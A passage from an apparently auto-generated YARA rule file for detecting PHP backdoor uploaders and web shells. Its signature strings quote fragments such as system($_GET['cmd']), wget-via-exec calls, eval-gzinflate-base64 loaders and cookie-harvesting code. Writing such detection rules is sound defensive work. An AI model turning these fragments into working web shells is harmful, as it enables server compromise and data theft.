        $trigger = "$data = @openssl_encrypt($data, \"AES-256-CBC\", base64_decode($key), 0, substr(base64_decode($key),"
    condition:
        $trigger and PR00727
}

rule php_backdoor_uploader_376 : backdoor
{
    strings:
        $trigger = "-c config.json >/dev/null 2>&1 &\");echo $result;if ($result){echo"
    condition:
        $trigger and PR02062
}

private rule PR03108 : trigger
{
    strings:
        $ps0 = "$body=$_REQUEST["
    condition:
        $ps0
}

rule php_backdoor_uploader_377 : backdoor
{
    strings:
        $trigger = "$_SERVER['DOCUMENT_ROOT']"
    condition:
        $trigger and PR01362 and PR03108 and PR03031
}

private rule PR03109 : trigger
{
    strings:
        $ps0 = "{')||strstr($"
    condition:
        $ps0
}

private rule PR03110 : trigger
{
    strings:
        $ps0 = "preg_match_all('/[<][?]php[\\s\\S]*?[?]>/i',"
    condition:
        $ps0
}

rule php_backdoor_uploader_378 : backdoor
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR03109 and PR03110 and PR01479
}

// MANUAL FIX NECESSARY
private rule PR03111 : trigger
{
    strings:
        $ps0 = "\"wb\");"
    condition:
        $ps0
}

rule php_backdoor_uploader_379 : backdoor
{
    strings:
        $trigger = "file_get_contents"
        $php_backdoor_uploader_379_r0 = /file_get_contents\(.http/
        $php_backdoor_uploader_379_r1 = /\$fp[\s]*=[\s]*fopen\([^\)]+php.,[\s]*.wb.\);[\s]*fwrite\(.fp,[\s]*file_get_contents\(.http/
    condition:
        $trigger and PR00355 and PR03111 and PR00357 and $php_backdoor_uploader_379_r0 and $php_backdoor_uploader_379_r1
}

// MANUAL FIX NECESSARY
rule php_backdoor_uploader_379_02 : backdoor
{
    strings:
        $trigger = "<?php file_put_contents("
        $php_backdoor_uploader_379_02_r0 = /file_put_contents\([^,]+,[\s]*file_get_contents/
    condition:
        $trigger and $php_backdoor_uploader_379_02_r0
}

private rule PR03112 : trigger
{
    strings:
        $ps0 = "</body></html>\";if(isset($_POST['uploaded']))"
    condition:
        $ps0
}

rule php_backdoor_uploader_380 : backdoor
{
    strings:
        $trigger = "move_uploaded_file"
    condition:
        $trigger and PR03112 and PR01021 and PR02769 and PR02870
}

private rule PR03113 : trigger
{
    strings:
        $ps0 = "$isInj=file_put_contents($file->getPathname(),$str,LOCK_EX);"
    condition:
        $ps0
}

rule php_backdoor_uploader_381 : backdoor
{
    strings:
        $trigger = "REQUE"
    condition:
        $trigger and PR03113 and PR00397
}

private rule PR03114 : trigger
{
    strings:
        $ps0 = "$dump = '<?php"
    condition:
        $ps0
}

rule php_backdoor_uploader_382 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR01553 and PR01468 and PR03114 and PR01534
}

rule php_backdoor_uploader_383 : backdoor
{
    strings:
        $trigger = "LUnHDrZVDnya0fx7IwftiRw+ZYb"
    condition:
        $trigger and PR02205
}

private rule PR03115 : trigger
{
    strings:
        $ps0 = "move_uploaded_file($_FILES['file']['tmp_name'], $uploaddir);"
    condition:
        $ps0
}

rule php_backdoor_uploader_384 : backdoor
{
    strings:
        $trigger = "multipart/form-data"
    condition:
        $trigger and PR03115 and PR02034
}

rule php_backdoor_uploader_385 : backdoor
{
    strings:
        $trigger = "eval (gzinflate(base64_decode(str_rot13(\"ML/EF8ZjRZns"
    condition:
        $trigger
}

// MANUAL FIX NECESSARY
private rule PR03116 : trigger
{
    strings:
        $ps0 = "<input type=\"file\" name=\"image\" />"
    condition:
        $ps0
}

rule php_backdoor_uploader_386 : backdoor
{
    strings:
        $trigger = "<form action=\"\" method=\"POST\" enctype=\"multipart/form-data\">"
        $php_backdoor_uploader_386_r0 = /strtolower\(end\(explode\(.\..,\$_FILES\[.[\w]+.\]\[.[\w]+.\]\)\)\);/
    condition:
        $trigger and PR03116 and PR01021 and PR02870 and PR01648 and $php_backdoor_uploader_386_r0
}

private rule PR03117 : trigger
{
    strings:
        $ps0 = "\".json_encode($result).\""
    condition:
        $ps0
}

rule php_backdoor_uploader_387 : backdoor
{
    strings:
        $trigger = ".md5(time()).md5(time())."
    condition:
        $trigger and PR00435 and PR00341 and PR03117
}

rule php_backdoor_uploader_388 : backdoor
{
    strings:
        $trigger = "exec(\"wget {$"
    condition:
        $trigger and PR01330 and PR00046
}

rule php_backdoor_uploader_389 : backdoor
{
    strings:
        $trigger = "file_get_contents($shell);"
    condition:
        $trigger
}

private rule PR03118 : trigger
{
    strings:
        $ps0 = "oZyincWnlatbWZWeo9adkrLFx9ar"
    condition:
        $ps0
}

rule php_backdoor_uploader_390 : backdoor
{
    strings:
        $trigger = "chr(ord(substr($"
    condition:
        $trigger and PR00732 and PR03118 and PR01550 and PR01551
}

rule php_backdoor_uploader_391 : backdoor
{
    strings:
        $trigger = "ZXVlIGFzICRjdXJyZW50X2RpcikNCiAgICB7DQogICAgICAgIGlm"
    condition:
        $trigger and PR01398
}

private rule PR03119 : trigger
{
    strings:
        $ps0 = "$name = trim($_POST['newname']).'.php';"
    condition:
        $ps0
}

private rule PR03120 : trigger
{
    strings:
        $ps0 = "touch(__FILE__, filemtime(\"index.php\"));"
    condition:
        $ps0
}

rule php_backdoor_uploader_392 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR03119 and PR00355 and PR03120 and PR00357
}

rule php_backdoor_uploader_393 : backdoor
{
    strings:
        $trigger = "md5($_GET["
    condition:
        $trigger and PR00046 and PR02987 and PR01330 and PR02769
}

private rule PR03121 : trigger
{
    strings:
        $ps0 = "dirname(__FILE__).DIRECTORY_SEPARATOR.$_FILES["
    condition:
        $ps0
}

rule php_backdoor_uploader_394 : backdoor
{
    strings:
        $trigger = "multipart/form-data"
    condition:
        $trigger and PR01648 and PR03121
}

// MANUAL FIX NECESSARY
rule php_backdoor_uploader_395 : backdoor
{
    strings:
        $trigger = "@copy($_FILES["
        $php_backdoor_uploader_395_r0 = /<\?php[\s]*@copy\(\$_FILES\[[^\]]+\]\[[^\]]+\],[\s]*\$_POST\[[^\]]+\]\);/
    condition:
        $trigger and $php_backdoor_uploader_395_r0
}

private rule PR03122 : trigger
{
    strings:
        $ps0 = "{$filter1=$_REQUEST['_f1'];$filter2=$_REQUEST["
    condition:
        $ps0
}

rule php_backdoor_uploader_396 : backdoor
{
    strings:
        $trigger = "<?php if(md5(@$_REQUEST["
    condition:
        $trigger and PR03122
}

private rule PR03123 : trigger
{
    strings:
        $ps0 = "echo \"<br>DisablePHP=\"."
    condition:
        $ps0
}

rule php_backdoor_uploader_397 : backdoor
{
    strings:
        $trigger = "echo\"<br><form method=post enctype=multipart/"
    condition:
        $trigger and PR03123 and PR02941 and PR01382
}

private rule PR03124 : trigger
{
    strings:
        $ps0 = "define('MY_BASE_URL', $ShellUri);"
    condition:
        $ps0
}

rule php_backdoor_uploader_398 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR01428 and PR03124 and PR01021
}

private rule PR03125 : trigger
{
    strings:
        $ps0 = "<b>go suce.!</b><"
    condition:
        $ps0
}

rule php_backdoor_uploader_399 : backdoor
{
    strings:
        $trigger = "$_FILES["
    condition:
        $trigger and PR00507 and PR03125
}

private rule PR03126 : trigger
{
    strings:
        $ps0 = "<b>success</b>-->"
    condition:
        $ps0
}

rule php_backdoor_uploader_400 : backdoor
{
    strings:
        $trigger = "($_POST)"
    condition:
        $trigger and PR03126
}

rule php_backdoor_uploader_401 : backdoor
{
    strings:
        $trigger = "if(isset($_POST['upload'])) { if(@copy($_FILES["
    condition:
        $trigger and PR00046
}

private rule PR03127 : trigger
{
    strings:
        $ps0 = "$zip = new ZipArchive;"
    condition:
        $ps0
}

rule php_backdoor_uploader_402 : backdoor
{
    strings:
        $trigger = "str_ireplace('.txt','.php'"
    condition:
        $trigger and PR03127
}

private rule PR03128 : trigger
{
    strings:
        $ps0 = "ini_set('display_errors',"
    condition:
        $ps0
}

private rule PR03129 : trigger
{
    strings:
        $ps0 = "echo \"ok\";"
    condition:
        $ps0
}

private rule PR03130 : trigger
{
    strings:
        $ps0 = "$handle = fopen($file"
    condition:
        $ps0
}

rule php_backdoor_uploader_403 : backdoor
{
    strings:
        $trigger = "@$filename = $_POST['filename'];"
    condition:
        $trigger and PR03128 and PR03129 and PR03130
}

private rule PR03131 : trigger
{
    strings:
        $ps0 = "if($id == 0)"
    condition:
        $ps0
}

private rule PR03132 : trigger
{
    strings:
        $ps0 = "@$id = $_GET[\"id\"];"
    condition:
        $ps0
}

rule php_backdoor_uploader_403_02 : backdoor
{
    strings:
        $trigger = "echo \"ok\";"
    condition:
        $trigger and PR03128 and PR03131 and PR03132 and PR03130 and PR00507
}

rule php_backdoor_uploader_404 : backdoor
{
    strings:
        $trigger = "code = $str_auth->decode($code,"
    condition:
        $trigger and PR00029 and PR02283
}

rule php_backdoor_uploader_405 : backdoor
{
    strings:
        $trigger = "}file_put_contents($dir, $data);if(file_exists($dir)){echo"
    condition:
        $trigger and PR01528 and PR01529
}

private rule PR03133 : trigger
{
    strings:
        $ps0 = "ob_start"
    condition:
        $ps0
}

rule php_backdoor_uploader_406 : backdoor
{
    strings:
        $trigger = "=gzinflate(ob_get_contents());ob_end_clean();eval($"
    condition:
        $trigger and PR03133
}

private rule PR03134 : trigger
{
    strings:
        $ps0 = "display:none"
    condition:
        $ps0
}

rule php_backdoor_uploader_407 : backdoor
{
    strings:
        $trigger = "<form method=\"get\">"
    condition:
        $trigger and PR03134 and PR01369 and PR01021 and PR02769 and PR02870 and PR01648
}

private rule PR03135 : trigger
{
    strings:
        $ps0 = "touch(dirname(__FILE__).'/'.basename(__FILE__),$"
    condition:
        $ps0
}

rule php_backdoor_uploader_408 : backdoor
{
    strings:
        $trigger = "touch($"
    condition:
        $trigger and PR00435 and PR00341 and PR03135
}

private rule PR03136 : trigger
{
    strings:
        $ps0 = "=base64_decode(base64_decode($"
    condition:
        $ps0
}

rule php_backdoor_uploader_409 : backdoor
{
    strings:
        $trigger = "fopen("
    condition:
        $trigger and PR03136 and PR01403
}

private rule PR03137 : trigger
{
    strings:
        $ps0 = "if (isset($_FILES["
    condition:
        $ps0
}

rule php_backdoor_uploader_410 : backdoor
{
    strings:
        $trigger = "$_FILES['azzatssins']"
    condition:
        $trigger and PR00046 and PR01021 and PR02769 and PR03137 and PR01648
}

private rule PR03138 : trigger
{
    strings:
        $ps0 = "$_SERVER['REQUEST_SCHEME'] != '' ? $_SERVER['REQUEST_SCHEME'] : 'http') . '://' . $"
    condition:
        $ps0
}

rule php_backdoor_uploader_411 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR01468 and PR03138 and PR01899
}

private rule PR03139 : trigger
{
    strings:
        $ps0 = ").GetIP().'-'.base64_encode('http:"
    condition:
        $ps0
}

rule php_backdoor_uploader_412 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR03139
}

private rule PR03140 : trigger
{
    strings:
        $ps0 = "exec($code,$array);"
    condition:
        $ps0
}

private rule PR03141 : trigger
{
    strings:
        $ps0 = "php_sapi_name())"
    condition:
        $ps0
}

rule php_backdoor_uploader_413 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR01468 and PR03140 and PR01899 and PR03141
}

private rule PR03142 : trigger
{
    strings:
        $ps0 = "((strpos($get_content, 'confirm:start of editor file') !== false) && (strpos($get_content"
    condition:
        $ps0
}

rule php_backdoor_uploader_415 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR01428 and PR01021 and PR03142
}

private rule PR03143 : trigger
{
    strings:
        $ps0 = "function scandirsgml($dir,$arr)"
    condition:
        $ps0
}

rule php_backdoor_uploader_416 : backdoor
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR03143 and PR01431
}

private rule PR03144 : trigger
{
    strings:
        $ps0 = "move_uploaded_file($_FILES['f']['tmp_name'], $_FILES['f']['name']);"
    condition:
        $ps0
}

rule php_backdoor_uploader_417 : backdoor
{
    strings:
        $trigger = "if(!empty($_POST['file_upload']))"
    condition:
        $trigger and PR03144
}

private rule PR03145 : trigger
{
    strings:
        $ps0 = ");unlink($"
    condition:
        $ps0
}

rule php_backdoor_uploader_419 : backdoor
{
    strings:
        $trigger = "&& md5($_POST["
    condition:
        $trigger and PR00435 and PR03145 and PR02103
}

// MANUAL FIX NECESSARY
rule php_backdoor_uploader_419_02 : backdoor
{
    strings:
        $trigger = ",'<?php '.$"
        $php_backdoor_uploader_419_02_r0 = /\$[\w][\s]*=[\s]*...;[\s]*\$[\w][\s]*=[\s]*\$_REQUEST\[...\];[\s]*\$[\w]+[\s]*=[\s]*base64_decode\(\$.\);[\s]*file_put_contents[^\)]+\);[\s]*include\(\$.\);[\s]*unlink\(\$[\w]+\);[\s]*/
    condition:
        $trigger and PR00435 and PR03145 and $php_backdoor_uploader_419_02_r0
}

rule php_backdoor_uploader_419_03 : backdoor
{
    strings:
        $trigger = ",'<?php '.$"
    condition:
        $trigger and PR00435 and PR01392 and PR03145
}

// MANUAL FIX NECESSARY
rule php_backdoor_uploader_419_04 : backdoor
{
    strings:
        $trigger = ",'<?php '.$"
        $php_backdoor_uploader_419_04_r0 = /ini_set\('display_errors',[\s]*0\);/
    condition:
        $trigger and PR00435 and PR03145 and $php_backdoor_uploader_419_04_r0
}

private rule PR03146 : trigger
{
    strings:
        $ps0 = ");die();}}else{"
    condition:
        $ps0
}

rule php_backdoor_uploader_419_05 : backdoor
{
    strings:
        $trigger = "&& md5($_POST["
    condition:
        $trigger and PR00435 and PR03146 and PR03145 and PR02103
}

// MANUAL FIX NECESSARY
rule php_backdoor_uploader_419_06 : backdoor
{
    strings:
        $trigger = "&& md5($_POST["
        $php_backdoor_uploader_419_06_r0 = /if\(file_exists\(\$\w+\)\)\{include\(\$\w+\);unlink\(\$\w+\);\}\}/
    condition:
        $trigger and PR00435 and PR03145 and PR02103 and $php_backdoor_uploader_419_06_r0
}

// MANUAL FIX NECESSARY
private rule PR03147 : trigger
{
    strings:
        $ps0 = "chmod(\"jeentel\" , 0755);"
    condition:
        $ps0
}

rule php_backdoor_uploader_420 : backdoor
{
    strings:
        $trigger = "file_get_contents"
        $php_backdoor_uploader_420_r0 = /file_get_contents\(.http/
    condition:
        $trigger and PR00355 and PR03147 and PR00357 and $php_backdoor_uploader_420_r0
}

rule php_backdoor_uploader_421 : backdoor
{
    strings:
        $trigger = "LUrHDvS4DX6aYDc394Kc3D3uvV0C2"
    condition:
        $trigger and PR02205
}

private rule PR03148 : trigger
{
    strings:
        $ps0 = "move_uploaded_file($"
    condition:
        $ps0
}

private rule PR03149 : trigger
{
    strings:
        $ps0 = "echo file_put_contents($"
    condition:
        $ps0
}

rule php_backdoor_uploader_422 : backdoor
{
    strings:
        $trigger = "md5($_POST["
    condition:
        $trigger and PR03148 and PR03149
}

private rule PR03150 : trigger
{
    strings:
        $ps0 = "fwrite($resource,date(\"F d, Y / h:i:sa\").\" - \".$_REQUEST[\"delete\"].\" deleted by \".$_SERVER[\"REMOTE_ADDR\"].\"\\n\");"
    condition:
        $ps0
}

rule php_backdoor_uploader_423 : backdoor
{
    strings:
        $trigger = "file_"
    condition:
        $trigger and PR03150
}

rule php_backdoor_uploader_423_02 : backdoor
{
    strings:
        $trigger = ">Silentum Uploader"
    condition:
        $trigger and PR02208
}

rule php_backdoor_uploader_424 : backdoor
{
    strings:
        $trigger = "<title>Uploader By rizky07</title>"
    condition:
        $trigger
}

private rule PR03151 : trigger
{
    strings:
        $ps0 = "fwrite(fopen($"
    condition:
        $ps0
}

rule php_backdoor_uploader_425 : backdoor
{
    strings:
        $trigger = "if(isset($_POST["
    condition:
        $trigger and PR00046 and PR03151
}

rule php_backdoor_uploader_426 : backdoor
{
    strings:
        $trigger = "echo '[*]Good permission.' . $payload"
    condition:
        $trigger and PR00435
}

rule php_backdoor_uploader_427 : backdoor
{
    strings:
        $trigger = "str_replace($auth_pass, md5(trim($_POST["
    condition:
        $trigger and PR00029 and PR01819
}

rule php_backdoor_uploader_428 : backdoor
{
    strings:
        $trigger = "@file_put_contents($_POST["
    condition:
        $trigger and PR02936
}

private rule PR03152 : trigger
{
    strings:
        $ps0 = "content' => http_build_query($_POST),"
    condition:
        $ps0
}

private rule PR03153 : trigger
{
    strings:
        $ps0 = "NvZGUucGhw')"
    condition:
        $ps0
}

rule php_backdoor_uploader_429 : backdoor
{
    strings:
        $trigger = "$url = base64_decode('aHR0c"
    condition:
        $trigger and PR03152 and PR03153 and PR01431
}

private rule PR03154 : trigger
{
    strings:
        $ps0 = "vci5waHA="
    condition:
        $ps0
}

rule php_backdoor_uploader_429_02 : backdoor
{
    strings:
        $trigger = "$url = base64_decode('aHR0c"
    condition:
        $trigger and PR03152 and PR03154 and PR01431
}

private rule PR03155 : trigger
{
    strings:
        $ps0 = ");return base64_decode($a[$i]);}"
    condition:
        $ps0
}

private rule PR03156 : trigger
{
    strings:
        $ps0 = "]=Array(base64_decode("
    condition:
        $ps0
}

rule php_backdoor_uploader_430 : backdoor
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR01545 and PR03155 and PR03156
}

rule php_backdoor_uploader_430_02 : backdoor
{
    strings:
        $trigger = "]=Array(base64_decode("
    condition:
        $trigger and PR01545 and PR03155 and PR01392 and PR01021
}

rule php_backdoor_uploader_430_03 : backdoor
{
    strings:
        $trigger = "]=Array(base64_decode("
    condition:
        $trigger and PR01545 and PR03155 and PR01021 and PR02180
}

private rule PR03157 : trigger
{
    strings:
        $ps0 = "ini_set('display_errors', 0);"
    condition:
        $ps0
}

rule php_backdoor_uploader_430_04 : backdoor
{
    strings:
        $trigger = "]=Array(base64_decode("
    condition:
        $trigger and PR01545 and PR03155 and PR01021 and PR03157
}

private rule PR03158 : trigger
{
    strings:
        $ps0 = "= TRUE;  $GLOBALS"
    condition:
        $ps0
}

private rule PR03159 : trigger
{
    strings:
        $ps0 = "if (!isset($"
    condition:
        $ps0
}

rule php_backdoor_uploader_430_05 : backdoor
{
    strings:
        $trigger = "]=Array(base64_decode("
    condition:
        $trigger and PR03158 and PR01545 and PR03155 and PR01021 and PR03159
}

private rule PR03160 : trigger
{
    strings:
        $ps0 = "if(function_exists(\"unlink\")){"
    condition:
        $ps0
}

rule php_backdoor_uploader_431 : backdoor
{
    strings:
        $trigger = "$save=fopen($_GET['name'],\"w\");"
    condition:
        $trigger and PR01780 and PR03160
}

rule php_backdoor_uploader_432 : backdoor
{
    strings:
        $trigger = "str_rot13('svyr_trg_pbagragf');"
    condition:
        $trigger and PR00435
}

private rule PR03161 : trigger
{
    strings:
        $ps0 = "if(function_exists(\"file_get_contents\")){"
    condition:
        $ps0
}

private rule PR03162 : trigger
{
    strings:
        $ps0 = "if(!empty ($_FILES['file']) and md5(md5(md5($_POST["
    condition:
        $ps0
}

rule php_backdoor_uploader_433 : backdoor
{
    strings:
        $trigger = "file name : \".$_FILES['file']['name'];"
    condition:
        $trigger and PR03161 and PR02062 and PR03162 and PR01021
}

private rule PR03163 : trigger
{
    strings:
        $ps0 = "$username.\"|:|:|\".$password.\"|:|:|\".$_SERVER['REMOTE_ADDR']"
    condition:
        $ps0
}

rule php_backdoor_uploader_434 : backdoor
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR03161 and PR03163 and PR02062
}

private rule PR03164 : trigger
{
    strings:
        $ps0 = "'.time();"
    condition:
        $ps0
}

private rule PR03165 : trigger
{
    strings:
        $ps0 = "$_HEADERS = getallheaders();"
    condition:
        $ps0
}

private rule PR03166 : trigger
{
    strings:
        $ps0 = "file_put_contents($f, $c);"
    condition:
        $ps0
}

rule php_backdoor_uploader_435 : backdoor
{
    strings:
        $trigger = "(isset($_HEADERS["
    condition:
        $trigger and PR03164 and PR03165 and PR03166
}

private rule PR03167 : trigger
{
    strings:
        $ps0 = "]('', $_HEADERS["
    condition:
        $ps0
}

private rule PR03168 : trigger
{
    strings:
        $ps0 = "= $_HEADERS["
    condition:
        $ps0
}

rule php_backdoor_uploader_435_02 : backdoor
{
    strings:
        $trigger = "(isset($_HEADERS["
    condition:
        $trigger and PR03167 and PR03165 and PR03168
}

rule php_backdoor_uploader_435_03 : backdoor
{
    strings:
        $trigger = "md5(md5(md5($_POST['token_admin'])))"
    condition:
        $trigger
}

private rule PR03169 : trigger
{
    strings:
        $ps0 = "$targetFile =  str_replace('//','/',$targetPath"
    condition:
        $ps0
}

rule php_backdoor_uploader_436 : backdoor
{
    strings:
        $trigger = "$targetPath = $_SERVER['DOCUMENT_ROOT'] . $_REQUEST['folder'] . '/';"
    condition:
        $trigger and PR03169 and PR02208
}

private rule PR03170 : trigger
{
    strings:
        $ps0 = "explode (\"?\",$_SERVER['REQUEST_URI']"
    condition:
        $ps0
}

rule php_backdoor_uploader_437 : backdoor
{
    strings:
        $trigger = "str_"
    condition:
        $trigger and PR03127 and PR03170
}

rule php_backdoor_uploader_439 : backdoor
{
    strings:
        $trigger = "$file = ($name) ? $name.'.'.$silver : $link_info['basename'];"
    condition:
        $trigger and PR01726 and PR00046 and PR01330
}

rule php_backdoor_uploader_440 : backdoor
{
    strings:
        $trigger = "$uploadfile = $uploaddir . basename($_FILES['userfile']['name']);"
    condition:
        $trigger and PR00046 and PR01021 and PR02769 and PR01648 and PR01666
}

private rule PR03171 : trigger
{
    strings:
        $ps0 = "$php = $srv[\"PHP_SELF\"]; $req=str_replace(array($php,'?'),'',$req);$x=explode('|',$req);"
    condition:
        $ps0
}

rule php_backdoor_uploader_441 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR01468 and PR03171
}

private rule PR03172 : trigger
{
    strings:
        $ps0 = "</form><?php if ($_SERVER[\"REQUEST_METHOD\"] == \"POST\") { $tmp_name = $_FILES[\"image\"]; echo $tmp_name; print_r($tmp_name); move_uploaded_file($_FILES['image"
    condition:
        $ps0
}

rule php_backdoor_uploader_442 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR03172
}

rule php_backdoor_uploader_443 : backdoor
{
    strings:
        $trigger = "ZWNhbHBlcl9ydHM='));eval($"
    condition:
        $trigger
}

private rule PR03173 : trigger
{
    strings:
        $ps0 = "strrev('stnetnoc_tup_elif');$c($_SERVER['DOCUMENT_ROOT']."
    condition:
        $ps0
}

rule php_backdoor_uploader_445 : backdoor
{
    strings:
        $trigger = "file"
    condition:
        $trigger and PR03173
}

private rule PR03174 : trigger
{
    strings:
        $ps0 = "} elseif(function_exists('exec')) { @exec($"
    condition:
        $ps0
}

rule php_backdoor_uploader_446 : backdoor
{
    strings:
        $trigger = "move_uploaded_file"
    condition:
        $trigger and PR03174 and PR01369 and PR01021 and PR02769 and PR02870
}

private rule PR03175 : trigger
{
    strings:
        $ps0 = "@unlink(__"
    condition:
        $ps0
}

private rule PR03176 : trigger
{
    strings:
        $ps0 = "$file"
    condition:
        $ps0
}

private rule PR03177 : trigger
{
    strings:
        $ps0 = "bajatax"
    condition:
        $ps0
}

rule php_backdoor_uploader_447 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR03175 and PR03176 and PR03177
}

private rule PR03178 : trigger
{
    strings:
        $ps0 = "Echo '<center>"
    condition:
        $ps0
}

private rule PR03179 : trigger
{
    strings:
        $ps0 = "$cwd = getcwd();"
    condition:
        $ps0
}

rule php_backdoor_uploader_448 : backdoor
{
    strings:
        $trigger = "$_FILES["
    condition:
        $trigger and PR03178 and PR01648 and PR03179 and PR02769
}

private rule PR03180 : trigger
{
    strings:
        $ps0 = "@file_put_contents($_POST["
    condition:
        $ps0
}

rule php_backdoor_uploader_449 : backdoor
{
    strings:
        $trigger = "base64_decode($_POST["
    condition:
        $trigger and PR03180
}

private rule PR03181 : trigger
{
    strings:
        $ps0 = ",@fgetc($"
    condition:
        $ps0
}

private rule PR03182 : trigger
{
    strings:
        $ps0 = "))@fwrite($"
    condition:
        $ps0
}

private rule PR03183 : trigger
{
    strings:
        $ps0 = "echo(dirname(__FILE__));"
    condition:
        $ps0
}

private rule PR03184 : trigger
{
    strings:
        $ps0 = "echo(\"OK\");"
    condition:
        $ps0
}

rule php_backdoor_uploader_450 : backdoor
{
    strings:
        $trigger = "$_POST"
    condition:
        $trigger and PR03181 and PR03182 and PR03183 and PR03184
}

private rule PR03185 : trigger
{
    strings:
        $ps0 = "error_reporting(0);$f=$_FILES["
    condition:
        $ps0
}

rule php_backdoor_uploader_451 : backdoor
{
    strings:
        $trigger = "];copy($f[tmp_name],$f[name]);"
    condition:
        $trigger and PR03185
}

private rule PR03186 : trigger
{
    strings:
        $ps0 = "file_put_contents($log_file_name, base64_encode(serialize($_SERVER)) . PHP_EOL . base64_encode(serialize($_COOKIE)) . PHP_EOL"
    condition:
        $ps0
}

rule php_backdoor_uploader_452 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR03186
}

private rule PR03187 : trigger
{
    strings:
        $ps0 = ") { while(!feof($"
    condition:
        $ps0
}

private rule PR03188 : trigger
{
    strings:
        $ps0 = "strpos($_SERVER["
    condition:
        $ps0
}

rule php_backdoor_uploader_454 : backdoor
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR03187 and PR01362 and PR03188
}

rule php_backdoor_uploader_455 : backdoor
{
    strings:
        $trigger = "explode(\"\\n\", $_POST["
    condition:
        $trigger and PR00046 and PR01468 and PR01330
}

private rule PR03189 : trigger
{
    strings:
        $ps0 = "eval(gzinflate($"
    condition:
        $ps0
}

rule php_backdoor_uploader_456 : backdoor
{
    strings:
        $trigger = "(128 / 2)"
    condition:
        $trigger and PR03189
}

private rule PR03190 : trigger
{
    strings:
        $ps0 = "if (@copy($_FILES["
    condition:
        $ps0
}

rule php_backdoor_uploader_457 : backdoor
{
    strings:
        $trigger = "404 Not Found"
    condition:
        $trigger and PR03190 and PR00046 and PR01330
}

private rule PR03191 : trigger
{
    strings:
        $ps0 = "LUrXEqs4Ev2aqbn7Uw41QuRxoll82"
    condition:
        $ps0
}

rule php_backdoor_uploader_458 : backdoor
{
    strings:
        $trigger = "eval(str_rot13(gzinflate(str_rot13(base64_decode("
    condition:
        $trigger and PR03191
}

rule php_backdoor_uploader_459 : backdoor
{
    strings:
        $trigger = "system($_GET['cmd']); echo"
    condition:
        $trigger and PR00046 and PR03148 and PR02769 and PR02870
}

// MANUAL FIX NECESSARY
rule php_backdoor_uploader_460 : backdoor
{
    strings:
        $trigger = "eval(\"?>\".gzinflate(\"\\x95\\x92"
        $php_backdoor_uploader_460_r0 = /<\?php[\s]*@?eval/
    condition:
        $trigger and $php_backdoor_uploader_460_r0
}

private rule PR03192 : trigger
{
    strings:
        $ps0 = ";};}}}else{if(@$_GET["
    condition:
        $ps0
}

rule php_backdoor_uploader_461 : backdoor
{
    strings:
        $trigger = "if(fwrite(fopen(stripslashes($_POST["
    condition:
        $trigger and PR03192 and PR00046
}

private rule PR03193 : trigger
{
    strings:
        $ps0 = "$path.basename($_FILES["
    condition:
        $ps0
}

rule php_backdoor_uploader_462 : backdoor
{
    strings:
        $trigger = "],$path)){echo"
    condition:
        $trigger and PR00046 and PR03148 and PR03193 and PR02769
}

// MANUAL FIX NECESSARY
rule php_backdoor_uploader_463 : backdoor
{
    strings:
        $trigger = "copy($_FILES"
        $php_backdoor_uploader_463_r0 = /if\(copy\(\$_FILES\[.[\w]+.\]\[.[\w]+.\],\$[\w]+\....\.\$_FILES\[.[\w]+.\]\[.[\w]+.\]\)\)\{/
    condition:
        $trigger and PR02387 and $php_backdoor_uploader_463_r0
}

private rule PR03194 : trigger
{
    strings:
        $ps0 = "$out.='<changelog>'.strip_tags($plug->sections->changelog).'</changelog>'.\"\\n\";"
    condition:
        $ps0
}

private rule PR03195 : trigger
{
    strings:
        $ps0 = "echo '<try_up>';"
    condition:
        $ps0
}

rule php_backdoor_uploader_464 : backdoor
{
    strings:
        $trigger = "header('Content-Type:"
    condition:
        $trigger and PR03194 and PR03195 and PR01431
}

private rule PR03196 : trigger
{
    strings:
        $ps0 = "['name'])) echo \"<status_success>\";}"
    condition:
        $ps0
}

rule php_backdoor_uploader_465 : backdoor
{
    strings:
        $trigger = "$_FILES["
    condition:
        $trigger and PR01648 and PR03196
}

private rule PR03197 : trigger
{
    strings:
        $ps0 = "|| is_null($_FILES["
    condition:
        $ps0
}

private rule PR03198 : trigger
{
    strings:
        $ps0 = "http_response_code($"
    condition:
        $ps0
}

rule php_backdoor_uploader_466 : backdoor
{
    strings:
        $trigger = "($_POST["
    condition:
        $trigger and PR03197 and PR02768 and PR03198
}

rule php_backdoor_uploader_467 : backdoor
{
    strings:
        $trigger = "@base64_encode(serialize($_REQUEST).\"--\".serialize($_COOKIE).\"--\".$_SERVER['REQUEST_URI']);"
    condition:
        $trigger and PR00435
}

rule php_backdoor_uploader_467_02 : backdoor
{
    strings:
        $trigger = "@base64_encode(serialize($_GET).\"--\".serialize($_COOKIE)."
    condition:
        $trigger and PR00435
}

private rule PR03199 : trigger
{
    strings:
        $ps0 = "serialize(file_get_contents('php://input')).\"--\".serialize($_COOKIE))"
    condition:
        $ps0
}

rule php_backdoor_uploader_467_03 : backdoor
{
    strings:
        $trigger = "__DIR__ ."
    condition:
        $trigger and PR00435 and PR03199
}

private rule PR03200 : trigger
{
    strings:
        $ps0 = "echo\"<b>Uploaded</b>-->"
    condition:
        $ps0
}

rule php_backdoor_uploader_468 : backdoor
{
    strings:
        $trigger = "multipart/form-data"
    condition:
        $trigger and PR03200 and PR02034
}

rule php_backdoor_uploader_469 : backdoor
{
    strings:
        $trigger = "'>OK-Click here!</a></h1>\""
    condition:
        $trigger and PR00046 and PR03148 and PR01021 and PR02769 and PR02870
}

private rule PR03201 : trigger
{
    strings:
        $ps0 = "explode(\";\", strrev("
    condition:
        $ps0
}

